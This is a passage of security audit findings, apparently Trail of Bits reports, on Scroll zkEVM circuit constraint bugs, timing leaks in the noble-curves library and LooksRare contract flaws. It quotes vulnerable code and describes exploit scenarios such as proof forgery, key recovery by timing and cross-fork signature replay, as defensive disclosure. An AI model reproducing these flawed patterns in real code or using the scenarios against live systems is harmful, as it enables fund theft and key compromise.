constraints specied in the documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf", "body": "The gadget for checking the consistency of nonexistence proofs is missing several constraints related to type 2 nonexistence proofs. The circuit specication includes constraints for the nonexistence of path proofs that are not included in the implementation. This causes the witness values to be unconstrained in some cases. For example, the following constraints are specied:  other_key_hash should equal 0 when key does not equal other_key.  other_leaf_data_hash should equal the hash of the empty node (pointer by other_key). Neither of these constraints is enforced in the implementation: this is because the implementation has no explicit constraints imposed for the type 2 nonexistence proofs. Figure 3.1 shows that the circuit constrains these values only for type 1 proofs. pub fn configure<F: FieldExt>( cb: &mut ConstraintBuilder<F>, value: SecondPhaseAdviceColumn, key: AdviceColumn, other_key: AdviceColumn, key_equals_other_key: IsZeroGadget, hash: AdviceColumn, hash_is_zero: IsZeroGadget, other_key_hash: AdviceColumn, other_leaf_data_hash: AdviceColumn, poseidon: &impl PoseidonLookup, ) { cb.assert_zero(\"value is 0 for empty node\", value.current()); cb.assert_equal( \"key_minus_other_key = key - other key\", key_equals_other_key.value.current(), key.current() - other_key.current(), ); cb.assert_equal( \"hash_is_zero input == hash\", hash_is_zero.value.current(), hash.current(), ); let is_type_1 = !key_equals_other_key.current(); let is_type_2 = hash_is_zero.current(); cb.assert_equal( \"Empty account is either type 1 xor type 2\", Query::one(), Query::from(is_type_1.clone()) + Query::from(is_type_2), ); cb.condition(is_type_1, |cb| { cb.poseidon_lookup( \"other_key_hash == h(1, other_key)\", [Query::one(), other_key.current(), other_key_hash.current()], poseidon, ); cb.poseidon_lookup( \"hash == h(key_hash, other_leaf_data_hash)\", [ other_key_hash.current(), other_leaf_data_hash.current(), hash.current(), ], poseidon, ); }); Figure 3.1: mpt-circuit/src/gadgets/mpt_update/nonexistence_proof.rs#754 The Scroll team has stated that this is a specication error and that the missing constraints do not impact the soundness of the circuit. Recommendations Short term, update the specication to remove the description of these constraints; ensure that the documentation is kept updated. Long term, add positive and negative tests for both types of nonexistence proofs.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "4. Discrepancies between the MPT circuit specication and implementation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf", "body": "The MPT circuit implementation is not faithful to the circuit specication in many areas and does not contain comments for the constraints that are either missing from the implementation or that diverge from those in the specication. The allowed segment transitions depend on the proof type. For the NonceChanged proof type, the specication states that the Start segment type can transition to Start and that the AccountLeaf0 segment type also can transition to Start. However, neither of these paths is allowed in the implementation. MPTProofType::NonceChanged | MPTProofType::BalanceChanged | MPTProofType::CodeSizeExists | MPTProofType::CodeHashExists => [ SegmentType::Start, vec![ SegmentType::AccountTrie, // mpt has > 1 account SegmentType::AccountLeaf0, // mpt has <= 1 account ], ( ), ( SegmentType::AccountTrie, vec![ SegmentType::AccountTrie, SegmentType::AccountLeaf0, SegmentType::Start, // empty account proof ], ), (SegmentType::AccountLeaf0, vec![SegmentType::AccountLeaf1]), (SegmentType::AccountLeaf1, vec![SegmentType::AccountLeaf2]), (SegmentType::AccountLeaf2, vec![SegmentType::AccountLeaf3]), (SegmentType::AccountLeaf3, vec![SegmentType::Start]), Figure 4.1: mpt-circuit/src/gadgets/mpt_update/segment.rs#20 Figure 4.2: Part of the MPT specication (spec/mpt-proof.md#L318-L328) The transitions allowed for the PoseidonCodeHashExists proof type also do not match: the specication states that it has the same transitions as the NonceChanged proof type, but the implementation has dierent transitions. The key depth direction checks also do not match the specication. The specication states that the depth parameter should be used but the implementation uses depth - 1. cb.condition(is_trie.clone(), |cb| { cb.add_lookup( \"direction is correct for key and depth\", [key.current(), depth.current() - 1, direction.current()], key_bit.lookup(), ); cb.assert_equal( \"depth increases by 1 in trie segments\", depth.current(), depth.previous() + 1, ); cb.condition(path_type.current_matches(&[PathType::Common]), |cb| { cb.add_lookup( \"direction is correct for other_key and depth\", [ other_key.current(), depth.current() - 1, Figure 4.3: mpt-circuit/src/gadgets/mpt_update.rs#188 Figure 4.4: Part of the MPT specication (spec/mpt-proof.md#L279-L282) Finally, the specication states that when a segment type is a non-trie type, the value of key should be constrained to 0, but this constraint is omitted from the implementation. cb.condition(!is_trie, |cb| { cb.assert_zero(\"depth is 0 in non-trie segments\", depth.current()); }); Figure 4.5: mpt-circuit/src/gadgets/mpt_update.rs#212214 Figure 4.6: Part of the MPT specication (spec/mpt-proof.md#L284-L286) Recommendations Short term, review the specication and ensure its consistency. Match the implementation with the specication, and document possible optimizations that remove constraints, detailing why they do not cause soundness issues. Long term, include both positive and negative tests for all edge cases in the specication.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "5. Redundant lookups in the Word RLC circuit ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf", "body": "The Word RLC circuit has two redundant lookups into the BytesLookup table. The Word RLC circuit combines the random linear combination (RLC) for the lower and upper 16 bytes of a word into a single RLC value. For this, it checks that the lower and upper word segments are 16 bytes by looking into the BytesLookup table, and it checks that their RLCs are correctly computed by looking into the RlcLookup table. However, the lookup into the RlcLookup table will also ensure that the lower and upper segments of the word have the correct 16 bytes, making the rst two lookups redundant. pub fn configure<F: FieldExt>( cb: &mut ConstraintBuilder<F>, [word_hash, high, low]: [AdviceColumn; 3], [rlc_word, rlc_high, rlc_low]: [SecondPhaseAdviceColumn; 3], poseidon: &impl PoseidonLookup, bytes: &impl BytesLookup, rlc: &impl RlcLookup, randomness: Query<F>, ) { cb.add_lookup( \"old_high is 16 bytes\", [high.current(), Query::from(15)], bytes.lookup(), ); cb.add_lookup( \"old_low is 16 bytes\", [low.current(), Query::from(15)], bytes.lookup(), ); cb.poseidon_lookup( \"word_hash = poseidon(high, low)\", [high.current(), low.current(), word_hash.current()], poseidon, ); cb.add_lookup( \"rlc_high = rlc(high) and high is 16 bytes\", [high.current(), Query::from(15), rlc_high.current()], rlc.lookup(), ); cb.add_lookup( \"rlc_low = rlc(low) and low is 16 bytes\", [low.current(), Query::from(15), rlc_low.current()], rlc.lookup(), Figure 5.1: mpt-circuit/src/gadgets/mpt_update/word_rlc.rs#1649 Although the WordRLC::configure function receives two dierent lookup objects, bytes and rlc, they are instantiated with the same concrete lookup: let mpt_update = MptUpdateConfig::configure( cs, &mut cb, poseidon, &key_bit, &byte_representation, &byte_representation, &rlc_randomness, &canonical_representation, ); Figure 5.2: mpt-circuit/src/mpt.rs#6069 We also note that the labels refer to the upper and lower bytes as old_high and old_low instead of just high and low. Recommendations Short term, determine whether both the BytesLookup and RlcLookup tables are needed for this circuit, and refactor the circuit accordingly, removing the redundant constraints. Long term, review the codebase for duplicated or redundant constraints using manual and automated methods.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "6. The NonceChanged conguration circuit does not constrain the new value nonce value ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf", "body": "The NonceChanged conguration circuit does not constrain the config.new_value parameter to be 8 bytes. Instead, there is a duplicated constraint for config.old_value: SegmentType::AccountLeaf3 => { cb.assert_zero(\"direction is 0\", config.direction.current()); let old_code_size = (config.old_hash.current() - config.old_value.current()) * Query::Constant(F::from(1 << 32).square().invert().unwrap()); let new_code_size = (config.new_hash.current() - config.new_value.current()) * Query::Constant(F::from(1 << 32).square().invert().unwrap()); cb.condition( config.path_type.current_matches(&[PathType::Common]), |cb| { cb.add_lookup( \"old nonce is 8 bytes\", [config.old_value.current(), Query::from(7)], bytes.lookup(), ); cb.add_lookup( \"new nonce is 8 bytes\", [config.old_value.current(), Query::from(7)], bytes.lookup(), ); Figure 6.1: mpt-circuit/src/gadgets/mpt_update.rs#12091228 This means that a malicious prover could update the Account node with a value of arbitrary length for the Nonce and Codesize parameters. The same constraint (with a correct label but incorrect value) is used in the ExtensionNew path type: cb.condition( config.path_type.current_matches(&[PathType::ExtensionNew]), |cb| { cb.add_lookup( \"new nonce is 8 bytes\", [config.old_value.current(), Query::from(7)], bytes.lookup(), ); Figure 6.2: mpt-circuit/src/gadgets/mpt_update.rs#12411248 Exploit Scenario A malicious prover uses the NonceChanged proof to update the nonce with a larger than expected value. Recommendations Short term, enforce the constraint for the config.new_value witness. Long term, add positive and negative testing of the edge cases present in the specication. For both the Common and ExtensionNew path types, there should be a negative test that fails because it changes the new nonce to a value larger than 8 bytes. Use automated testing tools like Semgrep to nd redundant and duplicate constraints, as these could indicate that a constraint is incorrect.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "7. The Copy circuit does not totally enforce the tag values ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf", "body": "The Copy table includes a tag column that indicates the type of data for that particular row. However, the Copy circuit tag validation function does not totally ensure that the tag matches one of the predened tag values. The implementation uses the copy_gadgets::constrain_tag function to bind the is_precompiled, is_tx_calldata, is_bytecode, is_memory, and is_tx_log witnesses to the actual tag value. However, the code does not ensure that exactly one of these Boolean values is true. #[allow(clippy::too_many_arguments)] pub fn constrain_tag<F: Field>( meta: &mut ConstraintSystem<F>, q_enable: Column<Fixed>, tag: BinaryNumberConfig<CopyDataType, 4>, is_precompiled: Column<Advice>, is_tx_calldata: Column<Advice>, is_bytecode: Column<Advice>, is_memory: Column<Advice>, is_tx_log: Column<Advice>, ) { meta.create_gate(\"decode tag\", |meta| { let enabled = meta.query_fixed(q_enable, CURRENT); let is_precompile = meta.query_advice(is_precompiled, CURRENT); let is_tx_calldata = meta.query_advice(is_tx_calldata, CURRENT); let is_bytecode = meta.query_advice(is_bytecode, CURRENT); let is_memory = meta.query_advice(is_memory, CURRENT); let is_tx_log = meta.query_advice(is_tx_log, CURRENT); let precompiles = sum::expr([ tag.value_equals( CopyDataType::Precompile(PrecompileCalls::Ecrecover), CURRENT, )(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Sha256), CURRENT)(meta), tag.value_equals( CopyDataType::Precompile(PrecompileCalls::Ripemd160), CURRENT, )(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Identity), CURRENT)(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Modexp), CURRENT)(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Bn128Add), CURRENT)(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Bn128Mul), CURRENT)(meta), tag.value_equals( CopyDataType::Precompile(PrecompileCalls::Bn128Pairing), CURRENT, )(meta), tag.value_equals(CopyDataType::Precompile(PrecompileCalls::Blake2F), CURRENT)(meta), ]); vec![ // Match boolean indicators to their respective tag values. enabled.expr() * (is_precompile - precompiles), enabled.expr() * (is_tx_calldata - tag.value_equals(CopyDataType::TxCalldata, CURRENT)(meta)), enabled.expr() CURRENT)(meta)), * (is_bytecode - tag.value_equals(CopyDataType::Bytecode, enabled.expr() * (is_memory - tag.value_equals(CopyDataType::Memory, CURRENT)(meta)), enabled.expr() * (is_tx_log - tag.value_equals(CopyDataType::TxLog, CURRENT)(meta)), ] }); } Figure 7.1: copy_circuit/copy_gadgets.rs#1362 In fact, the tag value could equal CopyDataType::RlcAcc, as in the SHA3 gadget. The CopyDataType::Padding value is also not currently matched. In the current state of the codebase, this issue does not appear to cause any soundness issues because the lookups into the Copy table either use a statically set source and destination tag or, as in the case of precompiles, the value is correctly bounded and does not pose an avenue of attack for a malicious prover. We also observe that the Copy circuit specication mentions a witness value for the is_rlc_acc case, but this is not reected in the code. Recommendations Short term, ensure that the tag column is fully constrained. Review the circuit specication and match the implementation with the specication, documenting possible optimizations that remove constraints and detailing why they do not cause soundness issues. Long term, include negative tests for an unintended tag value.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "8. The invalid creation error handling circuit is unconstrained ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf", "body": "The invalid creation error handling circuit does not constrain the rst byte of the actual memory to be 0xef as intended. This allows a malicious prover to redirect the EVM execution to a halt after the CREATE opcode is called, regardless of the memory value. The ErrorInvalidCreationCodeGadget circuit was updated to accommodate the memory addressing optimizations. However, in doing so, the first_byte witness value that was bound to the memorys rst byte is no longer bound to it. Therefore, a malicious prover can always satisfy the circuit constraints, even if they are not in an error state after the CREATE opcode is called. fn configure(cb: &mut EVMConstraintBuilder<F>) -> Self { let opcode = cb.query_cell(); let first_byte = cb.query_cell(); //let address = cb.query_word_rlc(); let offset = cb.query_word_rlc(); let length = cb.query_word_rlc(); let value_left = cb.query_word_rlc(); cb.stack_pop(offset.expr()); cb.stack_pop(length.expr()); cb.require_true(\"is_create is true\", cb.curr.state.is_create.expr()); let address_word = MemoryWordAddress::construct(cb, offset.clone()); // lookup memory for first word cb.memory_lookup( 0.expr(), address_word.addr_left(), value_left.expr(), value_left.expr(), None, ); // let first_byte = value_left.cells[address_word.shift()]; // constrain first byte is 0xef let is_first_byte_invalid = IsEqualGadget::construct(cb, first_byte.expr(), 0xef.expr()); cb.require_true( \"is_first_byte_invalid is true\", is_first_byte_invalid.expr(), ); Figure 8.1: evm_circuit/execution/error_invalid_creation_code.rs#3667 Exploit Scenario A malicious prover generates two dierent proofs for the same transaction, one leading to the error state, and the other successfully executing the CREATE opcode. Distributing these proofs to two ends of a bridge leads to state divergence and a loss of funds. Recommendations Short term, bind the first_byte witness value to the memory value; ensure that the successful CREATE end state checks that the rst byte is dierent from 0xef. Long term, investigate ways to generate malicious traces that could be added to the test suite; every time a new soundness issue is found, create such a malicious trace and add it to the test suite.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "9. The OneHot primitive allows more than one value at once ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf", "body": "The OneHot primitive uses BinaryQuery values as witness values. However, despite their name, these values are not constrained to be Boolean values, allowing a malicious prover to choose more than one hot value in the data structure. impl<T: IntoEnumIterator + Hash + Eq> OneHot<T> { pub fn configure<F: FieldExt>( cs: &mut ConstraintSystem<F>, cb: &mut ConstraintBuilder<F>, ) -> Self { let mut columns = HashMap::new(); for variant in Self::nonfirst_variants() { columns.insert(variant, cb.binary_columns::<1>(cs)[0]); } let config = Self { columns }; cb.assert( \"sum of binary columns in OneHot is 0 or 1\", config.sum(0).or(!config.sum(0)), ); config } Figure 9.1: mpt-circuit/src/gadgets/one_hot.rs#1430 The reason the BinaryQuery values are not constrained to be Boolean is because the BinaryColumn conguration does not constrain the advice values to be Boolean, and the conguration is simply a type wrapper around the Column<Advice> type. This provides no guarantees to the users of this API, who might assume that these values are guaranteed to be Boolean. pub fn configure<F: FieldExt>( cs: &mut ConstraintSystem<F>, _cb: &mut ConstraintBuilder<F>, ) -> Self { let advice_column = cs.advice_column(); // TODO: constrain to be binary here... // cb.add_constraint() Self(advice_column) } Figure 9.2: mpt-circuit/src/constraint_builder/binary_column.rs#2937 The OneHot primitive is used to implement the Merkle pathchecking state machine, including critical properties such as requiring the key and other_key columns to remain unchanged along a given Merkle path calculation, as shown in gure 9.3. cb.condition( !segment_type.current_matches(&[SegmentType::Start, SegmentType::AccountLeaf3]), |cb| { cb.assert_equal( \"key can only change on Start or AccountLeaf3 rows\", key.current(), key.previous(), ); cb.assert_equal( \"other_key can only change on Start or AccountLeaf3 rows\", other_key.current(), other_key.previous(), ); }, ); Figure 9.3: mpt-circuit/src/gadgets/mpt_update.rs#170184 We did not develop a proof-of-concept exploit for the path-checking table, so it may be the case that the constraint in gure 9.3 is not exploitable due to other constraints. However, if at any point it is possible to match both SegmentType::Start and some other segment type (such as by setting one OneHot cell to 1 and another to -1), a malicious prover would be able to change the key partway through and forge Merkle updates. Exploit Scenario A malicious prover uses the OneHot soundness issue to bypass constraints, ensuring that the key and other_key columns remain unchanged along a given Merkle path calculation. This allows the attacker to successfully forge MPT update proofs that update an arbitrary key. Recommendations Short term, add constraints that ensure that the advice values from these columns are Boolean. Long term, add positive and negative tests ensuring that these constraint builders operate according to their expectations.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "10. Intermediate columns are not explicit ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf", "body": "The MPT update circuit includes two arrays of intermediate value columns, as shown in gure 10.1. intermediate_values: [AdviceColumn; 10], // can be 4? second_phase_intermediate_values: [SecondPhaseAdviceColumn; 10], // 4? Figure 10.1: mpt-circuit/src/gadgets/mpt_update.rs#6566 These columns are used as general-use cells for values that are only conditionally needed in a given row, reducing the total number of columns needed. For example, gure 10.2 shows that intermediate_values[0] is used for the address value in rows that match SegmentType::Start, but as shown in gure 10.3, rows representing the SegmentType::AccountLeaf3 state of a Keccak code-hash proof use that same slot for the old_high value. let address = self.intermediate_values[0].current() * is_start(); Figure 10.2: mpt-circuit/src/gadgets/mpt_update.rs#78 SegmentType::AccountLeaf3 => { cb.assert_equal(\"direction is 1\", config.direction.current(), Query::one()); let [old_high, old_low, new_high, new_low, ..] = config.intermediate_values; Figure 10.3: mpt-circuit/src/gadgets/mpt_update.rs#16321635 In some cases, cells of intermediate_values are used starting from the end of the intermediate_values column, such as the other_key_hash and other_leaf_data_hash values in PathType::ExtensionOld rows, as illustrated in gure 10.4. let [.., key_equals_other_key, new_hash_is_zero] = config.is_zero_gadgets; let [.., other_key_hash, other_leaf_data_hash] = config.intermediate_values; nonexistence_proof::configure( cb, config.new_value, config.key, config.other_key, key_equals_other_key, config.new_hash, new_hash_is_zero, other_key_hash, other_leaf_data_hash, poseidon, ); Figure 10.4: mpt-circuit/src/gadgets/mpt_update.rs#10361049 Although we did not nd any mistakes such as misused columns, this pattern is ad hoc and error-prone, and evaluating the correctness of this pattern requires checking every individual use of intermediate_values. Recommendations Short term, document the assignment of all intermediate_values columns in each relevant case. Long term, consider using Rust types to express the dierent uses of the various intermediate_values columns. For example, one could dene an IntermediateValues enum, with cases like StartRow { address: &AdviceColumn } and ExtensionOld { other_key_hash: &AdviceColumn, other_leaf_data_hash: &AdviceColumn }, and a single function fn parse_intermediate_values(segment_type: SegmentType, path_type: PathType, columns: &[AdviceColumn; 10]) -> IntermediateValues. Then, the correct assignment and use of intermediate_values columns can be audited only by checking parse_intermediate_values. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "1. Timing issues ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-ryanshea-noblecurveslibrary-securityreview.pdf", "body": "The library provides a scalar multiplication routine that aims to keep the number of BigInteger operations constant, in order to be (close to) constant-time. However, there are some locations in the implementation where timing dierences can cause issues:    Pre-computed point look-up during scalar multiplication (gure 1.1) Second part of signature generation Tonelli-Shanks square root computation // Check if we're onto Zero point. // Add random point inside current window to f. const offset1 = offset; const offset2 = offset + Math .abs(wbits) - 1 ; // -1 because we skip zero const cond1 = window % 2 !== 0 ; const cond2 = wbits < 0 ; if (wbits === 0 ) { // The most important part for const-time getPublicKey f = f.add(constTimeNegate(cond1, precomputes[offset1])); } else { p = p.add(constTimeNegate(cond2, precomputes[offset2])); } Figure 1.1: Pre-computed point lookup during scalar multiplication ( noble-curves/src/abstract/curve.ts:117128 ) The scalar multiplication routine comprises a loop, part of which is shown in Figure 1.1. Each iteration adds a selected pre-computed point to the accumulator p (or to the dummy accumulator f if relevant scalar bits are all zero). However, the array access to select the appropriate pre-computed point is not constant-time. Figure 1.2 shows how the implementation computes the second half of an ECDSA signature. 14 noble-curves Security Assessment const s = modN(ik * modN(m + modN(d * r))); // s = k^-1(m + rd) mod n Figure 1.2: Generation of the second part of the signature ( noble-curves/src/abstract/weierstrass.ts:988 ) First, the private key is multiplied by the rst half of the signature and reduced modulo the group order. Next, the message digest is added and the result is again reduced modulo the group order. If the modulo operation is not constant-time, and if an attacker can detect this timing dierence, they can perform a lattice attack to recover the signing key. The details of this attack are described in the TCHES 2019 article by Ryan . Note that the article does not show that this timing dierence attack can be practically exploited, but instead mounts a cache-timing attack to exploit it. FpSqrt is a function that computes square roots of quadratic residues over  . Based on   , this function chooses one of several sub-algorithms, including  the value of Tonelli-Shanks. Some of these algorithms are constant-time with respect to , but some are not. In particular, the implementation of the Tonelli-Shanks algorithm has a high degree of timing variability. The FpSqrt function is used to decode compressed point representations, so it can inuence timing when handling potentially sensitive or adversarial data. Most texts consider Tonelli-Shanks the fallback algorithm when a faster or simpler algorithm is unavailable. However, Tonelli-Shanks can be used for any prime modulus Further, Tonelli-Shanks can be made constant time for a given value of  .  . Timing leakage threats can be reduced by modifying the Tonelli-Shanks code to run in constant time (see here ), and making the constant-time implementation the default square root algorithm. Special-case algorithms can be broken out into separate functions (whether constant- or variable-time), for use when the modulus is known to work, or timing attacks are not a concern. Exploit Scenario An attacker interacts with a user of the library and measures the time it takes to execute signature generation or ECDH key exchange. In the case of static ECDH, the attacker may provide dierent public keys to be multiplied with the static private key of the library user. In the case of ECDSA, the attacker may get the user to repeatedly sign the same message, which results in scalar multiplications on the base point using the same deterministically generated nonce. The attacker can subsequently average the obtained execution times for operations with the same input to gain more precise timing estimates. Then, the attacker uses the obtained execution times to mount a timing attack: 15 noble-curves Security Assessment   In the case of ECDSA, the attacker may attempt to mount the attack from the TCHES 2019 article by Ryan . However, it is unknown whether this attack will work in practice when based purely on timing. In the case of static ECDH, the attacker may attempt to mount a recursive attack, similar to the attacks described in the Cardis 1998 article by Dhem et al. or the JoCE 2013 article by Danger et al. Note that the timing dierences caused by the precomputed point look-up may not be sucient to mount such a timing attack. The attacker would need to nd other timing dierences, such as dierences in the point addition routines based on one of the input points. The fact that the library uses a complete addition formula increases the diculty, but there could still be timing dierences caused by the underlying big integer arithmetic. Determining whether such timing attacks are practically applicable to the library (and how many executions they would need) requires a large number of measurements on a dedicated benchmarking system, which was not done as part of this engagement. Recommendations Short term, consider adding scalar randomization to primitives where the same private scalar can be used multiple times, such as ECDH and deterministic ECDSA. To mitigate the attack from the TCHES 2019 article by Ryan , consider either blinding the private scalar in the signature computation or removing the modular reduction of  =  (  *  (  +  *  )) , i.e.,     . Long term, ensure that all low-level operations are constant-time. References    Return of the Hidden Number Problem, Ryan, TCHES 2019 A Practical Implementation of the Timing Attack, Dhem et al., Cardis 1998 A synthesis of side-channel attacks on elliptic curve cryptography in smart-cards, Danger et al., JoCE 2013 16 noble-curves Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "1. Risk of reuse of signatures across forks due to lack of chainID validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "At construction, the LooksRareExchange contract computes the domain separator using the networks chainID , which is xed at the time of deployment. In the event of a post-deployment chain fork, the chainID cannot be updated, and the signatures may be replayed across both versions of the chain. constructor ( address _currencyManager , address _executionManager , address _royaltyFeeManager , address _WETH , address _protocolFeeRecipient ) { // Calculate the domain separator DOMAIN_SEPARATOR = keccak256 ( abi.encode( 0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f , // keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\") 0xda9101ba92939daf4bb2e18cd5f942363b9297fbc3232c9dd964abb1fb70ed71 , // keccak256(\"LooksRareExchange\") 0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6 , // keccak256(bytes(\"1\")) for versionId = 1 block.chainid , address ( this ) ) ); currencyManager = ICurrencyManager(_currencyManager); executionManager = IExecutionManager(_executionManager); royaltyFeeManager = IRoyaltyFeeManager(_royaltyFeeManager); WETH = _WETH; protocolFeeRecipient = _protocolFeeRecipient; Figure 1.1: contracts/contracts/LooksRareExchange.sol#L137-L145 The _validateOrder function in the LooksRareExchange contract uses a SignatureChecker function, verify , to check the validity of a signature: // Verify the validity of the signature require ( SignatureChecker.verify( orderHash, makerOrder.signer, makerOrder.v, makerOrder.r, makerOrder.s, DOMAIN_SEPARATOR ), \"Signature: Invalid\" ); Figure 1.2: contracts/contracts/LooksRareExchange.sol#L576-L587 However, the verify function checks only that a user has signed the domainSeparator . As a result, in the event of a hard fork, an attacker could reuse signatures to receive user funds on both chains. To mitigate this risk, if a change in the chainID is detected, the domain separator can be cached and regenerated. Alternatively, instead of regenerating the entire domain separator, the chainID can be included in the schema of the signature passed to the order hash. /** * @notice Returns whether the signer matches the signed message * @param hash the hash containing the signed mesage * @param signer the signer address to confirm message validity * @param v parameter (27 or 28) * @param r parameter * @param s parameter * @param domainSeparator paramer to prevent signature being executed in other chains and environments * @return true --> if valid // false --> if invalid */ function verify ( bytes32 hash , address signer , uint8 v , bytes32 r , bytes32 s , bytes32 domainSeparator ) internal view returns ( bool ) { // \\x19\\x01 is the standardized encoding prefix // https://eips.ethereum.org/EIPS/eip-712#specification bytes32 digest = keccak256 (abi.encodePacked( \"\\x19\\x01\" , domainSeparator, hash )); if (Address.isContract(signer)) { // 0x1626ba7e is the interfaceId for signature contracts (see IERC1271) return IERC1271(signer).isValidSignature(digest, abi.encodePacked(r, s, v)) == 0x1626ba7e ; } else { return recover(digest, v, r, s) == signer; } } Figure 1.3: contracts/contracts/libraries/SignatureChecker.sol#L41-L68 The signature schema does not account for the contracts chain. If a fork of Ethereum is made after the contracts creation, every signature will be usable in both forks. Exploit Scenario Bob signs a maker order on the Ethereum mainnet. He signs the domain separator with a signature to sell an NFT. Later, Ethereum is hard-forked and retains the same chain ID. As a result, there are two parallel chains with the same chain ID, and Eve can use Bobs signature to match orders on the forked chain. Recommendations Short term, to prevent post-deployment forks from aecting signatures, add the chain ID opcode to the signature schema. Long term, identify and document the risks associated with having forks of multiple chains and develop related mitigation strategies.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Lack of two-step process for contract ownership changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "The owner of a LooksRare protocol contract can be changed by calling the transferOwnership function in OpenZeppelins Ownable contract. This function internally calls the _transferOwnership function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. /** * @dev Leaves the contract without owner. It will not be possible to call * `onlyOwner` functions anymore. Can only be called by the current owner. * * NOTE: Renouncing ownership will leave the contract without an owner, * thereby removing any functionality that is only available to the owner. */ function renounceOwnership () public virtual onlyOwner { _transferOwnership( address ( 0 )); } /** * @dev Transfers ownership of the contract to a new account (`newOwner`). * Can only be called by the current owner. */ function transferOwnership ( address newOwner ) public virtual onlyOwner { require (newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ); _transferOwnership(newOwner); } /** * @dev Transfers ownership of the contract to a new account (`newOwner`). * Internal function without access restriction. */ function _transferOwnership ( address newOwner ) internal virtual { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); } Figure 2.1: OpenZeppelins Ownable contract Exploit Scenario Alice and Bob invoke the transferOwnership() function on the LooksRare multisig wallet to change the address of an existing contracts owner. They accidentally enter the wrong address, and ownership of the contract is transferred to the incorrect address. As a result, access to the contract is permanently revoked. Recommendations Short term, implement a two-step process to transfer contract ownership, in which the owner proposes a new address and then the new address executes a call to accept the role, completing the transfer. Long term, identify and document all possible actions that can be taken by privileged accounts ( appendix E ) and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "3. Project dependencies contain vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "Although dependency scans did not identify a direct threat to the project under review, npm and yarn audit identied a dependency with a known vulnerability. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details the high severity issue: CVE ID", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "4. Users that create ask orders cannot modify minPercentageToAsk ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/LooksRare.pdf", "body": "Users who sell their NFTs on LooksRare are unable to protect their orders against arbitrary changes in royalty fees set by NFT collection owners; as a result, users may receive less of a sales value than expected. Ideally, when a user lists an NFT, he should be able to set a threshold at which the transaction will execute based on the amount of the sales value that he will receive. This threshold is set via the minPercentageToAsk variable in the MakerOrder and TakerOrder structs. The minPercentageToAsk variable protects users who create ask orders from excessive royalty fees. When funds from an order are transferred, the LooksRareExchange contract ensures that the percentage amount that needs to be transferred to the recipient is greater than or equal to minPercentageToAsk (gure 3.1). function _transferFeesAndFunds ( address strategy , address collection , uint256 tokenId , address currency , address from , address to , uint256 amount , uint256 minPercentageToAsk ) internal { // Initialize the final amount that is transferred to seller uint256 finalSellerAmount = amount; // 1. Protocol fee { uint256 protocolFeeAmount = _calculateProtocolFee(strategy, amount); [...] finalSellerAmount -= protocolFeeAmount; } } // 2. Royalty fee { ( address royaltyFeeRecipient , uint256 royaltyFeeAmount ) = royaltyFeeManager.calculateRoyaltyFeeAndGetRecipient( collection, tokenId, amount ); // Check if there is a royalty fee and that it is different to 0 [...] finalSellerAmount -= royaltyFeeAmount; [...] require ( (finalSellerAmount * 10000 ) >= (minPercentageToAsk * amount), \"Fees: Higher than expected\" ); [...] } Figure 4.1: The _transferFeesAndFunds function in LooksRareExchange :422-466 However, users creating ask orders cannot modify minPercentageToAsk . By default, the minPercentageToAsk of orders placed through the LooksRare platform is set to 85%. In cases in which there is no royalty fee and the protocol fee is 2%, minPercentageToAsk could be set to 98%. Exploit Scenario Alice lists an NFT for sale on LooksRare. The protocol fee is 2%, 